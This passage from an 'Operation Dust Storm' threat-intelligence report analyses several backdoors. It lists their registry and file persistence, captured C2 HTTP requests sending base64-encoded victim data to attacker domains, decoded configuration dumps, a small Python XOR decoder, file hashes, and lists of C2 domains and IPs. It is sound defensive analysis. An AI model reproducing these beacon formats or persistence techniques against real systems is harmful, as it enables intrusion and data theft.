Identifier}\\msdtc.exe\n• May create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk \n• This shortcut will point to the msdtc.exe file in %CommonFiles% with the “/Start” switch\n• May create temporary files in %temp%\\{random numbers}.tmp\nRegistry Modifications:\n• Will temporarily create the registry key HKCU\\SOFTWARE\\AdobeSoft \n• May create the registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}\n• May create the Registry keys:\n• HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\ssl.projectscorp.net\\http\n• HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\ssl.projectscorp.net\\https\nNETWORK-BASED INDICATORS\nThe backdoor communicated to \"ssl.projectscorp.net\" and \"pic.elecarrow.com\" primarily on port 80; however, communication would also fallback to port 443 or 8080 if initial communication failed. The backdoor used HTTP to communicate with the C2 servers; data was transmitted base64 encoded in the URI of GET requests or sent in the body of a POST request. It used two hardcoded User-Agents, “FirefoxApp” and “Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)” in initial requests, as well as the default User-Agent of the system in its later communications. 14 OPERATION DUST STORM 15 OPERATION DUST STORM{Hostname}|Windows XP/{Username}|1??23Сʱ43??|TZ-131013|\n{Hostname}/{Username}/Administrators\nCreate User Error. 0\nCreate Directory Success.OpenScManager OK.FileSystem : NTFS\nNo AutoConfigURL.\nNo ProxyAddress.\nFigure 19: Decoded Data Parameter from Figure Above\nThe backdoor attempts to run a number of tests to determine the privilege level of the compromised user, including \nwhether or not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can access the service manager. This information is transmitted along with the type of file system and any proxy information necessary to access the Internet. The backdoor may also make network requests with the following variables in the URI “&type=ie&” , “stype=info&data=” , “stype=srv&data=” , “stype=con&data=” , “stype=user&data=” , “mmid=” , “&type=post&stype=” , or “&status=” .\nDETAILS\nIn a similar way as previous Dust Storm backdoors, this one attempted to detect whether or not the victim was using a Japanese keyboard via the “GetKeyboardType” API. The backdoor itself provided the attacker the ability to execute shell commands, enumerate system and network information, manipulate files, and download and execute an arbitrary file. Initial observations suggest this was largely a reconnaissance platform that would then be upgraded by the attacker to a full-featured backdoor.\nThe backdoor performed the initial tests described above by first attempting to add the user “Lost_{Unique Identifier}” with \nthe password “pond~!@ {Unique Identifier}” to the system using the NetUserAdd API; if successful, it then removed this user via the NetUserDel API. The backdoor then attempted to create the folder “%System%\\{Unique Identifier}” with the CreateDirectoryA API and removed it using the RemoveDirectoryA API. Once these two tests were complete, it attempted to access the Windows Service Control Manager through a call to “OpenSCManagerA” . Once it communicated this information along with proxy and file system info via the initial POST requests, the backdoor attempted to execute a sequence of commands to enumerate information about the system and local network.\n“net start”\n“Ipconfig /all”“net user” or “net user /domain” depending on the value of %USERDNSDOMAIN%\nFigure 20: Initial Commands Executed on the System by the Backdoor\nThe results of these commands are transmitted base64 encoded as the data parameter within the URI, “/pic/index.\nasp?id={Unique_Identifier}&type=ie&stype=info&data=” . Once the results of these commands are transmitted back to the C2 server, the backdoor will continue to beacon to the URI “/pic/index.asp?mmid={Unique Identifier}” and wait for either commands to execute or an updated binary to download and execute. Any file downloaded from the C2 is sent base64 encoded and has the name “{Unique Identifier}.txt” . If the file is a binary, it is written to disk as “tmp.exe” and executed via WinExec. The backdoor will then communicate back to the C2 with either “&status=run succeed” if successful, or “&status=Error Code” if there was an error.\nThe \"{Unique Identifier}\" referenced above is an eight-character hex-string calculated by adding the volume serial number of \nthe C drive (or D drive if there is no C) and a CRC32 hash of the first 0x90 bytes of the encoded configuration for the backdoor. This was quite different from the earlier Misdat variants, as it can be reversed to yield the serial number of the drive. The backdoor decodes its configuration information from offset 0xE9FC. It skips the first 4 bytes, then subtracts 0x2 from each byte and XOR’s the resultant values with the first byte of the configuration block, 0x58 in this case.Example HTTP requests are presented in the figures below.\nPOST hxxp://pic.elecarrow.com:80//Item/2016757.aspx HTTP/1.1  \nAccept: */*  \nContent-Type: application/x-www-form-urlencoded  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)  \nHost: pic.elecarrow.com:80  \nContent-Length: 93  \nConnection: Keep-Alive  \nCache-Control: no-cache\nPOST /pic/index.asp HTTP/1.1  \nAccept: Accept: */*, /pic/index.asp, ssl.projectscorp.net  \nContent-Type: application/x-www-form-urlencoded  \nUser-Agent: FirefoxApp  \nHost: ssl.projectscorp.net  \nContent-Length: 354  \nCache-Control: no-cacheid=E8C465FC&type=post&stype=info&data=VVNFUi1ENjkyMUY2MjE1fFdpbmRvd -\n3MgWFAvQWRtaW5pc3RyYXRvcnwxzOwyM9ChyrE0M7fWfFRaLTEzMTAxM3wNClVTRVIt -\nRDY5MjFGNjIxNS9BZG1pbmlzdHJhdG9yL0FkbWluaXN0cmF0b3JzDQpDcmVhdGUgVXNl -\nciBFcnJvci4gMA0KQ3JlYXRlIERpcmVjdG9yeSBTdWNjZXNzLg0KT3BlblNjTWFuYWdl -\nciBPSy4NCkZpbGVTeXN0ZW0gOiBOVEZTDQpObyBBdXRvQ29uZmlnVVJMLg0KTm8gUHJveHlB -\nZGRyZXNzLg==\nFigure 17: Initial POST Requests Sent by the S-Type Backdoor\nGET /pic/index.asp?id=E8C465FC&type=ie&stype=info&data=VVNFUi1ENjkyMUY2M-\njE1fFdpbmRvd3MgWFAvQWRtaW5pc3RyYXRvcnwxzOwyM9ChyrE0M7fWfFRaLTEzMTAxM3wNClVTR-VItRDY5MjFGNjIxNS9BZG1pbmlzdHJhdG9yL0FkbWluaXN0cmF0b3JzDQpDcmVhdGUgVXN-lciBFcnJvci4gMA0KQ3JlYXRlIERpcmVjdG9yeSBTdWNjZXNzLg0KT3BlblNjTWFuYWdlciBPSy4N-CkZpbGVTeXN0ZW0gOiBOVEZTDQpObyBBdXRvQ29uZmlnVVJMLg0KTm8gUHJveHlBZGRyZXNzLg== HTTP/1.1  \nAccept: */*  \nAccept-Language: en-us  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)  \nAccept-Encoding: gzip, deflate  \nHost: ssl.projectscorp.net  \nConnection: Keep-Alive\nGET /pic/index.asp?mmid=E8C465FC HTTP/1.1  \nAccept: */*  \nAccept-Language: en-us  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; \n.NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)  \nAccept-Encoding: gzip, deflate  \nHost: ssl.projectscorp.net  \nConnection: Keep-Alive\nFigure 18: Sample Get Requests Sent by the S-Type Backdoor16 OPERATION DUST STORM 17 OPERATION DUST STORM0000E9F0                                         58 2C 74 14             X,t.\n0000EA00   73 32 2E 2E 2A 64 79 79  2D 2D 36 78 2A 2C 39 34   s2..*dyy--6x*,940000EA10   3F 3D 2E 2D 3D 39 2C 2A  78 38 3F 2E 79 2A 33 3D   ?=.-=9,*x8?.y*3=0000EA20   79 33 38 3E 3F 22 78 3B  2D 2A 5A 5A 5A 5A 5A 5A   y38>?”x;-*ZZZZZZ0000EA30   5A 5A 5A 5A 4B 2A 33 3D  78 3F 36 3F 3D 3B 2C 2C   ZZZZK*3=x?6?=;,,0000EA40   39 31 78 3D 39 37 5A 5A  5A 5A 5A 5A 5A 5A 5A 5A   91x=97ZZZZZZZZZZ\n0000EA50   5A 5A 5A 5A 0A 5A E5 5B  CA 49 5A 5A 5A 5A 5A 5A   ZZZZ.Zå[ÊIZZZZZZ\n0000EA60   5A 5A 5A 5A 5A 5A 5A 5A  5A 5A 5A 5A 5A 5A 5A 5A   ZZZZZZZZZZZZZZZZ0000EA70   5A 5A 5A 5A 5A 5A 5A 5A  5A 5A 5A 5A 5A 5A 5A 5A   ZZZZZZZZZZZZZZZZ0000EA80   5A 5A 5A 5A 43 4F D3 5A  5A 5A 5A 5A 5A 5A 5A 5A   ZZZZCOÓZZZZZZZZZ\nFigure 21: Encoded Configuration Block\n0000EA00   29 68 74 74 70 3A 2F 2F 73 73 6C 2E 70 72 6F 6A  )hxxp://ssl.proj0000EA10   65 63 74 73 63 6F 72 70 2E 6E 65 74 2F 70 69 63  ectscorp.net/pic0000EA20   2F 69 6E 64 65 78 2E 61 73 70 00 00 00 00 00 00  /index.asp......0000EA30   00 00 00 00 11 70 69 63 2E 65 6C 65 63 61 72 72  .....pic.elecarr0000EA40   6F 77 2E 63 6F 6D 00 00 00 00 00 00 00 00 00 00  ow.com..........0000EA50   00 00 00 00 50 00 BB 01 90 1F 00 00 00 00 00 00  ....P.»........\n0000EA60   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n0000EA70   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0000EA80   00 00 00 00 19 15 89 00 00 00 00 00 00 00 00 00  ......‰.........\nFigure 22: Decoded Configuration Block\nText strings in the decoded block are each prefaced by their length in hex. In addition to the URL “hxxp:/ /ssl.projectscorp.net/\npic/index.asp” and the domain “pic.elecarrow.com” , the ports that attempt to beacon on 80, 443, and 8080 are highlighted in green, blue, and purple respectively. The following Python function can be used to decode these configuration blocks.\ndef sub_single_byte_xor(buf,subb, key):\n    out = ‘’    for i in buf:        out += chr((ord(i)-subb) ^ key)    return outsub_single_byte_xor(buf,0x2,0x58)\nFigure 23: Python Script to Decode w-Type Configuration Data50 00BB 0190 1FZLIB BACKDOOR (2014-2015)\nThis backdoor was the preferred second-stage implant for the group throughout 2014 and 2015. The malware was a full-\nfeatured backdoor with built-in NTLM proxy authentication support which was designed to be run as a ServiceDLL. Each sample SPEAR identified was customized to the specific victim environment and programmed using Microsoft Visual C++ 6. As a result, our team has included hashes of samples that were modified to redact victim information. SPEAR has provided as much information as possible so other victims can identify incidents. \nFILE CHARACTERISTICS\nModified SHA256  File Size  Compile Time\n73bc9650ab7871340ef1a6f68dfa71a650 2b9d9bee85181666da17a63a74178a143,872 Bytes 1/23/2015 3:22:25 UTC\n8cf3152169f3d7e05734b6b562752a0 0d566c4ea830c455ea094fa19dec4423c136,702 Bytes 1/05/2015 01:14:50 UTC\nbbc6d1b87352c3ae109b2c6c97baaf75 6b66378b6af8dbd7387229d04fc0b14134,144 Bytes 1/16/2015 3:21:31 UTC\nb4405f0caff1b786612aabbaa7431993f 44c83a2c8f8c0946a980da9c0c09156108,032 Bytes 1/23/2015 3:23:06 UTC\n85b80ed2aa871257f293a074d80eb64a 621ec74ec70c0cf1703f5f5adab23a67113,664 Bytes 1/05/2015 01:18:15 UTC\nFigure 24: Shareable File Characteristics\nAdditional File Details:\n• Exports the functions DriverDev, DriverInit, DriverLaunch, DriverProc\n• Mimics the resource version information of a legitimate Realtek Semiconductor Module, or Nvidia Module, or Synaptics module\n• PE checksum of zero\nHOST-BASED INDICATORS\nFile System Modifications:\n• All observed backdoor locations:\n• %WINDIR%\\system32\\cryptpol.dll\n• All Users %AppData%\\cryptpol.dll\n• All Users %AppData%\\wdd.ocx\n• All Users %AppData%\\athmgmt.dll\n• All Users %AppData%\\rasctl.dll\n• All Users %AppData%\\rtcomdll.dll\n• All Users %AppData%\\msnt.dll\n• May create randomly named temporary files in %AppData% ending in .tmp\n• May create temporary files in the %temp% directory that begin with the letters “tmp”\nRegistry Modifications:\n• Will create all necessary keys to configure the backdoor to run as a ServiceDLL, including redefining ServiceMain to point to another of the backdoor’s exported functions - all observed service names are below:\n• CryptPol – Cryptography Policy Control Service\n• AtherosMgMt – Atheros Communications Management Service\n• WDDSVC – Windows Display Driver\n• RASCtrl – Remote Access Control Center18 OPERATION DUST STORM 19 OPERATION DUST STORM00000320   FF FF FF FF 61 F6 90 7C  4E 6A DD 77 87 6A DD 77   ÿÿÿÿaö|NjÝw‡jÝw\n00000336   D4 B2 B8 00 03 00 00 80  FC 00 00 00 18 00 00 00   Ô²¸....€ü.......  \n00000352   FC 00 00 00 8C B2 B8 00  40 00 00 00 00 00 00 00   ü...Œ²¸.@.......  \n00000368   00 00 00 00 8A 00 8A 00  D4 B2 B8 00 88 B2 B8 00   ....Š.Š.Ô²¸.ˆ²¸.  \n00000384   00 00 00 00 18 B2 B8 00  84 B2 B8 00 DC FF B8 00   .....²¸.„²¸.Üÿ¸.00000400   78 17 DF 77 90 6A DD 77  FF FF FF FF 87 6A DD 77   x.ßwjÝwÿÿÿÿ‡jÝw\n00000416   95 6B DD 77 13 BD 00 00  A8 B2 B8 00 8B 70 DD 77   •kÝw.½..¨²¸.‹pÝw  \n00000432   00 01 00 00 9C B2 B8 00  C0 B2 B8 00 D4 BA B8 00   ....œ²¸.À²¸.Ôº¸.  \n00000448   B8 B2 B8 00 B0 B2 B8 00  00 08 00 00 72 00 00 00   ¸²¸.°²¸.....r...00000464   00 00 00 00 1A 00 1C 00  FA CF 90 7C 03 6C DD 77   ........úÏ|.lÝw  \n00000480   00 01 00 00 00 00 00 00  BC B2 B8 00 AB 6C DD 77   ........¼²¸.«lÝw  \n00000496   C4 B2 B8 00 A8 CD B8 00  7A DD 00 10 00 00 00 00   Ä²¸.¨Í¸.zÝ......  \n00000512   58 FC B3 00 70 50 02 10  00 00 00 00 53 00 2D 00   Xü³.pP......S.-.  \n00000528   31 00 2D 00 35 00 2D 00  31 00 38 00 89 5D 95 10   1.-.5.-.1.8.‰]•.  \n00000544   1C 01 00 00 05 00 00 00  01 00 00 00 28 0A 00 00   ............(...  \n00000560   02 00 00 00 53 00 65 00  72 00 76 00 69 00 63 00   ....S.e.r.v.i.c.  \n00000576   65 00 20 00 50 00 61 00  63 00 6B 00 20 00 33 00   e. .P.a.c.k. .3.  \n00000592   00 00 5C 00 43 00 75 00  72 00 72 00 65 00 6E 00   ..\\.C.u.r.r.e.n.00000608   74 00 56 00 65 00 72 00  73 00 69 00 6F 00 6E 00   t.V.e.r.s.i.o.n.  \n00000624   5C 00 49 00 6E 00 74 00  65 00 72 00 6E 00 65 00   \\.I.n.t.e.r.n.e.  \n00000640   74 00 20 00 53 00 65 00  74 00 74 00 69 00 6E 00   t. .S.e.t.t.i.n.  \n00000656   67 00 73 00 00 00 00 00  00 00 00 00 00 00 00 00   g.s.............  \n---Truncated---  \n00000816   00 00 00 00 03 00 00 00  00 01 01 00 00 00 00 00   ................  \n00000832   53 00 59 00 53 00 54 00  45 00 4D 00 00 00 00 00   S.Y.S.T.E.M.....  \n--Truncated---  \n00001264   00 00 00 00 00 00 00 00  00 00 00 00 E0 B5 B8 00   ............àµ¸.  \n00001280   99 51 91 7C 08 B6 B8 00  E4 00 08 00 04 00 00 00   ™Q‘|.¶¸.ä.......  \n00001296   D4 00 08 00 00 00 08 00  20 B6 B8 00 8B 53 91 7C   Ô....... ¶¸.‹S‘|  \n00001312   08 B6 B8 00 D4 00 08 00  00 00 00 00 10 00 00 00   .¶¸.Ô...........\n00001328   00 00 00 00 A4 B6 B8 00  7A CF 90 7C 7B 8B 91 7C   ....¤¶¸.zÏ|{‹‘|\n00001344   FF FF FF FF 40 B6 B8 00  01 00 00 00 D7 07 00 00   ÿÿÿÿ@¶¸.....×...\nFigure 26: Decompressed Contents of Initial POST Request\nThe hostname, context the backdoor was running under, operating system information, and user information were transmitted \nback to the C2 during a controlled test.\nDETAILS\nAnecdotal evidence suggests the attackers made few modifications to the backdoors themselves and instead simply updated the configuration information as needed. As a result, most of the backdoors identified had a PE checksum mismatch between the stated value and calculated value. The backdoor provided the attacker with the ability to upload and download files, enumerate files and drives, enumerate system information, enumerate and manipulate Windows services, enumerate and impersonate logon sessions, mimic keystrokes and mouse input, capture screenshots, and execute shell commands.\nThe backdoor itself contained very few unique plain-text strings or any other type of identifying information outside of the \nImport Table. The backdoor would initialize strings of interest on the stack by pushing one character at a time; this method has become increasingly common among malware authors to avoid antivirus heuristic methods. The backdoor’s configuration information was stored Zlib compressed within the binary with the size of the compressed data saved as a double word right before the start of the header “0x78 0x9C” . The decompressed data contained the Windows service name, Windows display NETWORK-BASED INDICATORS\nThe backdoor communicates to the preconfigured C2 servers via HTTP POST and GET requests. The contents of the communications are compressed using the standard Zlib compression library (http:/ /www.zlib.net/). During SPEAR’s limited testing, the User-Agent was always static and set to “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)” .\nPOST /EKTV/index.php?id=0 HTTP/1.1  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)  \nHost: bcsr.wordoscorp.com  \nAccept: */*  \nCache-Control: no-cache  \nConnection: Keep-Alive  \nContent-Length: 498\nPOST /EKTV/index.php?id=3580792616 HTTP/1.1  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)  \nHost: bcsr.wordoscorp.com  \nAccept: */*  \nCache-Control: no-cache  \nConnection: Keep-Alive  \nContent-Length: 490\nFigure 25: Initial POST Requests Sent by the Zlib Backdoor\n00000000  1C 12 00 00 1E 12 00 00 FF FF FF FF 40 05 00 00   ........ÿÿÿÿ@...  \n00000016  FE CD 18 9C 55 00 53 00 45 00 52 00 2D 00 44 00   þÍ.œU.S.E.R.-.D.  \n00000032  36 00 39 00 32 00 31 00 46 00 36 00 32 00 31 00   6.9.2.1.F.6.2.1.  \n00000048  35 00 00 00 DA D2 90 7C DC FF B8 00 20 E9 90 7C   5...ÚÒ|Üÿ¸. é|\n00000064  68 F6 90 7C FF FF FF FF 61 F6 90 7C EE D4 DD 77   hö|ÿÿÿÿaö|îÔÝw\n00000080  00 00 00 00 E0 CC B8 00 00 00 00 00 F9 D4 DD 77   ....àÌ¸.....ùÔÝw  \n00000096  00 00 00 00 00 00 00 00 FC 00 00 00 00 00 00 00   ........ü.......  \n00000112  20 00 00 00 00 00 00 00 9E 7E E5 14 52 55 D1 01    .......ž~å.RUÑ.  \n00000128  00 00 00 00 10 00 00 00 53 00 2D 00 31 00 2D 00   ........S.-.1.-.00000144  35 00 2D 00 9C B2 B8 00 6E D9 90 7C DC B1 B8 00   5.-.œ²¸.nÙ|Ü±¸.\n00000160  98 B1 B8 00 5C F6 90 7C 61 F6 90 7C DC B1 B8 00   ˜±¸.\\ö|aö|Ü±¸.\n00000176  6E D9 90 7C 9C B2 B8 00 74 B1 B8 00 7A D9 90 7C   nÙ|œ²¸.t±¸.zÙ|\n00000192  DC FF B8 00 20 E9 90 7C 68 F6 90 7C FF FF FF FF   Üÿ¸. é|hö|ÿÿÿÿ\n00000208  61 F6 90 7C EB 6F DD 77 34 00 00 C0 00 00 00 00   aö|ëoÝw4..À....\n00000224  D4 BA B8 00 F6 6F DD 77 C0 B2 B8 00 00 01 00 00   Ôº¸.öoÝwÀ²¸.....  \n00000240  B8 B2 B8 00 B0 B2 B8 00 00 01 00 00 D4 BA B8 00   ¸²¸.°²¸.....Ôº¸.  \n00000256  DC B1 B8 00 00 00 00 00  00 00 00 00 00 00 00 00   Ü±¸.............\n00000272  34 00 00 C0 0C B2 B8 00  5C F6 90 7C 61 F6 90 7C   4..À.²¸.\\ö|aö|\n00000288  00 00 00 00 8C B2 B8 00  2D F6 90 7C E8 B1 B8 00   ....Œ²¸.-ö|è±¸.\n00000304  EC B1 B8 00 54 B2 B8 00  20 E9 90 7C 68 F6 90 7C   ì±¸.T²¸. é|hö|\n(con’t)20 OPERATION DUST STORM 21 OPERATION DUST STORMname, and a description for the service. It also contained the filename the backdoor would use, the domain names and ports \nto beacon on, and the internal corporate proxy to use.\n00000000   43 00 72 00 79 00 70 00  74 00 50 00 6F 00 6C 00   C.r.y.p.t.P.o.l.  \n--Truncated---  \n00000060   00 00 00 00 43 00 72 00  79 00 70 00 74 00 6F 00   ....C.r.y.p.t.o.  \n00000070   67 00 72 00 61 00 70 00  68 00 79 00 20 00 50 00   g.r.a.p.h.y. .P.  \n00000080   6F 00 6C 00 69 00 63 00  79 00 20 00 43 00 6F 00   o.l.i.c.y. .C.o.  \n00000090   6E 00 74 00 72 00 6F 00  6C 00 20 00 53 00 65 00   n.t.r.o.l. .S.e.  \n000000A0   72 00 76 00 69 00 63 00  65 00 00 00 00 00 00 00   r.v.i.c.e.......  \n000000B0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................  \n--Truncated---  \n00000120   00 00 00 00 00 00 00 00  00 00 00 00 50 00 72 00   ............P.r.  \n00000130   6F 00 76 00 69 00 64 00  65 00 20 00 74 00 68 00   o.v.i.d.e. .t.h.  \n00000140   65 00 20 00 70 00 6F 00  6C 00 69 00 63 00 79 00   e. .p.o.l.i.c.y.  \n00000150   2D 00 62 00 61 00 73 00  65 00 64 00 20 00 62 00   -.b.a.s.e.d. .b.  \n00000160   61 00 73 00 69 00 63 00  20 00 63 00 72 00 79 00   a.s.i.c. .c.r.y.  \n00000170   70 00 74 00 6F 00 67 00  72 00 61 00 70 00 68 00   p.t.o.g.r.a.p.h.  \n00000180   79 00 20 00 73 00 65 00  72 00 76 00 69 00 63 00   y. .s.e.r.v.i.c.  \n00000190   65 00 2E 00 49 00 66 00  20 00 74 00 68 00 69 00   e...I.f. .t.h.i.  \n000001A0   73 00 20 00 73 00 65 00  72 00 76 00 69 00 63 00   s. .s.e.r.v.i.c.  \n000001B0   65 00 20 00 69 00 73 00  20 00 73 00 74 00 6F 00   e. .i.s. .s.t.o.  \n000001C0   70 00 70 00 65 00 64 00  2C 00 20 00 74 00 68 00   p.p.e.d.,. .t.h.  \n000001D0   65 00 20 00 63 00 72 00  79 00 70 00 74 00 6F 00   e. .c.r.y.p.t.o.  \n000001E0   67 00 72 00 61 00 70 00  68 00 79 00 20 00 70 00   g.r.a.p.h.y. .p.  \n000001F0   6F 00 6C 00 69 00 63 00  79 00 20 00 63 00 6F 00   o.l.i.c.y. .c.o.  \n00000200   6E 00 74 00 72 00 6F 00  6C 00 20 00 73 00 65 00   n.t.r.o.l. .s.e.  \n00000210   72 00 76 00 69 00 63 00  65 00 20 00 77 00 69 00   r.v.i.c.e. .w.i.  \n00000220   6C 00 6C 00 20 00 6E 00  6F 00 74 00 20 00 66 00   l.l. .n.o.t. .f.  \n00000230   75 00 6E 00 63 00 74 00  69 00 6F 00 6E 00 20 00   u.n.c.t.i.o.n. .  \n00000240   70 00 72 00 6F 00 70 00  65 00 72 00 6C 00 79 00   p.r.o.p.e.r.l.y.  \n00000250   2E 00 20 00 00 00 00 00  00 00 00 00 00 00 00 00   .. .............  \n---Truncated---  \n00000380   00 00 00 00 43 00 72 00  79 00 70 00 74 00 50 00   ....C.r.y.p.t.P.  \n00000390   6F 00 6C 00 2E 00 64 00  6C 00 6C 00 00 00 00 00   o.l...d.l.l.....  \n---Truncated---  \n00000580   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................  \n00000590   62 63 73 72 2E 77 6F 72  64 6F 73 63 6F 72 70 2E   bcsr.wordoscorp.  \n000005A0   63 6F 6D 00 00 00 00 00  00 00 00 00 00 00 00 00   com.............  \n---Truncated---  \n00000680   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 73   ...............s  \n00000690   50 00 00 00 6A 6E 68 73  2E 74 6F 6D 73 68 61 72   P...jnhs.tomshar  \n000006A0   64 70 63 2E 63 6F 6D 00  00 00 00 00 00 00 00 00   dpc.com.........  \n---Truncated---  \n00000780   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................  \n00000790   00 00 00 FF BB 01 00 00  4B 54 56 59 00 EE 12 00   ...ÿ»...KTVY.î..  \n000007A0   5F F1 C1 54 C8 AF 00 00  D7 07 00 00 01 00 00 00   _ñÁTÈ¯..×.......  \n000007B0   00 00 00 00 20 8E 01 00  5B 00 52 00 45 00 44 00   .... Ž..[.R.E.D.  \n000007C0   41 00 43 00 54 00 45 00  44 00 5D 00 00 00 00 00   A.C.T.E.D.].....  \n---Truncated\nFigure 27: Example Decoded Configuration DataAPPENDIX\nComplete Infrastructure - All Currently Known Domains and Subdomains:\n10bfym.8800.org\n10kjd.amazonwikis.com1stone.zapto.org323332.3322.orgadobekr.comadobeus.comamazonwikis.comaqyj.tomshardpc.comauto.glkjcorp.comb3fk.sfcorporation.combdgs.amazonwikis.combdt.wordoscorp.combfym2.amazonwikis.comblog.adobeus.comblog.amazonwikis.comblog.sfcorporation.comblog.wih365.combooks.sfcorporation.combybf.amazonwikis.combygs.sfcorporation.comcbgs.sfcorporation.comcdic.sfcorporation.comcxks.amazonwikis.comd2ch.sfcorporation.comdgfk.sfcorporation.comdghk.sfcorporation.comdown.adobeus.comekzy.gmnspace.comelecarrow.comen.amazonwikis.com exemail.netflash.adobeus.comfngs.adobeus.comfsw.adobeus.comgde.moviestops.comghlc.adobeus.comglkjcorp.comgmnspace.comguhk.moviestops.comhealth.dns1.ushglg.wordoscorp.comhjxt.sfcorporation.comhkabinc.comhkmj.amazonwikis.comhome.sfcorporation.comhsjs.wordoscorp.comhsy.moviestops.comiccbhhjdgb.adobeus.comimage.amazonwikis.comimage.hkabinc.comimnothk.8800.orgjggs.sfcorporation.comjiaoshow.9966.orgjnhs.tomshardpc.comjrfw.amazonwikis.comjrgs.sfcorporation.comjs.95nb.co.ccjs.adobekr.comjs.amazonwikis.comjs.exemail.netkb1gs.sfcorporation.comkersperskey.8800.orgkj.uuvod.netkrgt.tomshardpc.comlhbf.adobeus.comlogin.adobekr.comlogin.live.adobekr.comlogin.live.wih365.comlogin.wih365.commail.adobekr.commail.glkjcorp.commail.projectscorp.netmailxss.9966.orgmesdata.8866.orgmicrobing.oicp.netmicroses.9966.orgmicroupdate.8800.orgmicrowmies.oicp.netmobile.yqby.wordoscorp.commocrosoftds.xicp.netmodeless.3322.orgmovie.sfcorporation.commoviestops.commsejake.7766.orgmsevpn.3322.orgmusic.sfcorporation.comnet.amazonwikis.comnews.amazonwikis.comnews.elecarrow.comnews.sfcorporation.comnttvps.gnway.netpic.elecarrow.compic.glkjcorp.compic.hkabinc.compics.adobeus.compics.amazonwikis.comprojectscorp.netqsgs.sfcorporation.comrbjg.moviestops.comrbjg.moviestops.com rbny.sfcorporation.comrbxr.tomshardpc.comrjby.tomshardpc.comrjjh.wordoscorp.comrmax.amazonwikis.comruag.amazonwikis.comsane.adobeus.comsdj2b.3322.orgsfcorporation.comsgad.sfcorporation.comshowjiao.imzone.inshowshow.7766.orgsmgs.amazonwikis.comsmtp.adobekr.comsport.sfcorporation.comssl.elecarrow.comssl.exemail.netssl.gmnspace.comssl.projectscorp.netssl.sfcorporation.comsslmails.comsybf.adobeus.comtcgs.adobeus.comtdfg.moviestops.comtech.amazonwikis.comtest.uuvod.nettomshardpc.comtqsj.sfcorporation.comtzcl.sfcorporation.comtzz.exemail.netup.adobekr.comupdate.adobekr.comupdate.adobeus.comuworks.sfcorporation.comv.exemail.netvideo.sfcorporation.comvod.amazonwikis.comvod.sfcorporation.comvpntemp.3322.orgwbjs.sfcorporation.comweb.sfcorporation.comwed.amazonwikis.comwih365.comwordoscorp.comwsxg.moviestops.comwww.adobeus.comwww.projectscorp.netwww.wih365.comwxpb.sfcorporation.comxjgs.sfcorporation.comxkgs.sfcorporation.comxrgt.tomshardpc.comxrgt.wordoscorp.comyahoo.gmnspace.comyahoomail.adobeus.comygfk.sfcorporation.comyhkj.sfcorporation.comyjbf.amazonwikis.comyjxy.sfcorporation.comyqby.wordoscorp.comzdzl.sfcorporation.comziper.imbbs.inzpgx.tomshardpc.com\nAll Known IP  \nAddresses:\n108.171.240.154111.67.199.213111.67.199.222112.175.69.60112.175.69.89112.218.71.202113.10.139.218113.10.168.22113.11.202.233114.108.150.38116.255.131.152118.99.37.87118.193.163.143120.126.134.196120.31.68.42123.254.111.169124.162.53.203124.162.53.224125.46.42.221126.125.35.247126.25.172.171126.25.201.73173.252.201.210175.41.23.181203.124.12.24203.124.12.59210.105.192.3210.209.116.105210.209.117.148210.209.117.235210.51.13.167211.22.125.58211.42.249.37218.106.246.177218.106.246.189218.106.246.195218.106.246.220218.106.246.222218.106.246.254218.106.247.8123.238.229.12827.255.72.6827.255.72.6927.255.72.7859.188.13.13359.188.13.13722 OPERATION DUST STORM 23 OPERATION DUST STORMInfrastructure by Year (First DEFINITIVE Resolution Time)\n2010 C2 Infrastructure:\nIP Addresses:\n218.106.246.195\n218.106.246.220218.106.246.254111.67.199.213125.46.42.221124.162.53.224124.162.53.203113.11.202.233\nDomains:\nbfym2.amazonwikis.combooks.sfcorporation.comimnothk.8800.orgjiaoshow.9966.orgkb1gs.sfcorporation.comkersperskey.8800.orgmailxss.9966.orgmicroses.9966.orgmicroupdate.8800.orgmicrowmies.oicp.netmocrosoftds.xicp.netmodeless.3322.orgyhkj.sfcorporation.com\n2011 C2 Infrastructure:\nIP Addresses:\n218.106.247.81\n218.106.246.195218.106.246.177218.106.246.220125.46.42.221173.252.201.210120.126.134.196120.31.68.42\nDomains:\n*.moviestops.com323332.3322.orgadobekr.comjs.95nb.co.ccjs.adobekr.comlogin.live.adobekr.comlogin.live.wih365.commesdata.8866.orgmocrosoftds.xicp.netmsejake.7766.orgmsevpn.3322.orgsdj2b.3322.org\n2012 C2 Infrastructure:\nIP Addresses:\n210.51.13.167\n126.25.172.171218.106.246.195123.254.111.169114.108.150.38175.41.23.181126.25.201.73126.5.125.197203.124.12.24218.106.246.222203.124.12.59\nDomains:\nauto.glkjcorp.comgde.moviestops.comhealth.dns1.usmail.adobekr.commail.glkjcorp.comnttvps.gnway.netqsgs.sfcorporation.comsmtp.adobekr.comupdate.adobekr.comwsxg.moviestops.comwxpb.sfcorporation.com\n2013 C2 Infrastructure:\nIP 